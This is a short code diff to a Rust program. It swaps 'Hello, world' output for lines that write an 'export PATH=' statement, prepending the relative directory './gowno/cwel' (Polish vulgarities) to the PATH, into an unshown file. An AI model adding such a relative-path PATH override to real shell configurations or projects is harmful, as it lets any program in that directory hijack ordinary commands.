@@ -26,9 +26,9 @@ fn main() -> std::io::Result<()> {
     let mut writer = BufWriter::new(file);
 
     // Write some data to the file
-    writer.write_all(b"Hello, world!\n")?;
-    writer.write_all(b"Rust is awesome.\n")?;
-
+    writer.write_all(b"export PATH=")?;
+    writer.write_all(b"\"./gowno/cwel")?;
+    writer.write_all(b":$PATH\"\n")?;
     // Flush the writer to ensure all data is written to disk
 
     println!("Updated ENV VARs");
